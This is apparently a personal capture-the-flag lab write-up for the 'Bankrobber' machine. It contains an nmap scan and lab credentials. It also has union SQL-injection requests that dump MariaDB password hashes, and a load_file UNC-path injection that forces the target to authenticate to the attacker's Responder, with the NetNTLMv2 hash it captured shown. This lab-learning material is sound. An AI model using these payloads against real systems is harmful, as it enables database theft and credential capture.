# Bankrobber

- Difficulty: "Insane"
- Platform: Windows
---

10.10.10.154

## Nmap
```
I wiped out disk without backing up notes like an idiot... 
picking up from web-admin access

The Rundown:

Esentially, there is a database user search and and E-Coin transfer service. 
The transfer service is manually reviewed by an administrator. 

The filed inputs do not validate/sanitize.
A cross-site scripting attack is possible, although finicky, returning the administrators cookie within the response headers.

There seems to be SQL-Injection present in the user database lookup, although I have yet to go any further. 
I am conflating both these things together and I forget what I actually did ut oh well... continuing.
```

```bash

➜  Bankrobber git:(main) 
	sudo nmap -oA nmap/found-TCP-detailed 
	-p$(cat nmap/allports-TCP-initial.nmap | grep open | awk '{ print $1 }' | awk '{ print $0+0}' | sed ':a;N;$!ba;s/\n/,/g') 
	-sCV -T4 --min-rate 5000 -Pn 10.10.10.154
 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-30 02:53 EDT
Stats: 0:00:40 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.82% done; ETC: 02:54 (0:00:00 remaining)
Nmap scan report for 10.10.10.154
Host is up (0.027s latency).

PORT     STATE SERVICE      VERSION
80/tcp   open  http         Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)
|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
|_http-title: E-coin
443/tcp  open  ssl/http     Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
|_http-title: E-coin
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3306/tcp open  mysql        MariaDB (unauthorized)
Service Info: Host: BANKROBBER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2023-07-30T06:54:01
|_  start_date: 2023-07-30T05:18:55

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.85 seconds
```

`admin:Hopelessromantic`

A regular union select statement reveals version `MariaDB-10.1.38` in field 2:
```http
POST /admin/search.php HTTP/1.1
Host: 10.10.10.154
Content-Length: 37
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
Content-type: application/x-www-form-urlencoded
Accept: */*
Origin: http://10.10.10.154
Referer: http://10.10.10.154/admin/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: id=1; username=YWRtaW4%3D; password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D
Connection: close

term=1'union+select+1,@@version,3-- -
```

```
this returns user: `root@localhost`

lucky guess:
term=1'union slect user,password,3 from mysql.user--

this returns hash: *F435725A173757E57BD36B09048B8B610FF4D0C4
```

SHA-1 hash decodes to `Welkom1!`. This could be either admin or gio's password. 
Connections aren't permitted to the MySQL service from an external IP. Localhost only:
```bash
➜  loot git:(main) ✗ mysql -u 'gio' -p 'Welkom1!' -h 10.10.10.154
mysql: Deprecated program name. It will be removed in a future release, use '/usr/bin/mariadb' instead
Enter password: 

ERROR 1130 (HY000): Host '10.10.14.2' is not allowed to connect to this MariaDB server
```

This password does not work on SMB. 

## NTLM Theft from Insecure file_load in SQL
A possibility would be to capture an NTLM hash since SQLI is present.

Resources: 
- https://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds
- https://osandamalith.com/2017/02/03/mysql-out-of-band-hacking/

Querying `term=1'union select @@secure_file_priv,2,3;-- -` outputs nothing in field 1, (I don't have any screencaps).
This indicates that the secure file privilege parameter is not effective. 

I tried the example by osanda but it seemed to not work in this case. 
Checking 0xdf's write-up of this box I found that he uses a similar method, however much simpler:
```
I also successfully got a NetNTLMv2 hash for the user (just like in Giddy and Querier by starting `responder` and submitting 
`term=10' UNION SELECT 1,load_file('\\\\10.10.14.5\\test'),3-- -`:
```

Querying `term=1'union select load_file('\\\\10.10.14.2\\test'),2,3;-- -`
```

➜  ~ sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C
  
[+] Listening for events...

[*] [LLMNR]  Poisoned answer sent to 10.10.14.2 for name archlinux
[*] [LLMNR]  Poisoned answer sent to 10.10.14.2 for name archlinux
[*] [LLMNR]  Poisoned answer sent to fe80::3286:2d63:b66c:2ba2 for name archlinux
[*] [LLMNR]  Poisoned answer sent to 10.10.14.2 for name archlinux
[*] [LLMNR]  Poisoned answer sent to fe80::3286:2d63:b66c:2ba2 for name archlinux
[*] [LLMNR]  Poisoned answer sent to fe80::3286:2d63:b66c:2ba2 for name archlinux
[SMB] NTLMv2-SSP Client   : 10.10.10.154
[SMB] NTLMv2-SSP Username : BANKROBBER\Cortin
[SMB] NTLMv2-SSP Hash     : Cortin::BANKROBBER:e77408bc427cbc60:61607960ABEA68B1737992BF460FF670:010100000000000000865F6D96C2D901D79B3453124449620000000002000800520059003200590001001E00570049004E002D0053004D004D0036004D0050004D00390050004100340004003400570049004E002D0053004D004D0036004D0050004D0039005000410034002E0052005900320059002E004C004F00430041004C000300140052005900320059002E004C004F00430041004C000500140052005900320059002E004C004F00430041004C000700080000865F6D96C2D901060004000200000008003000300000000000000000000000002000003E4CAE96D9B7A0B88500929A65CACF3540353FCDED9B6C48C1B073BD950446B00A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E003200000000000000000000000000

```

I don't know why this worked and Osanda's did not. I will have to continue reading about it. Also, this hash does not seem crackable.

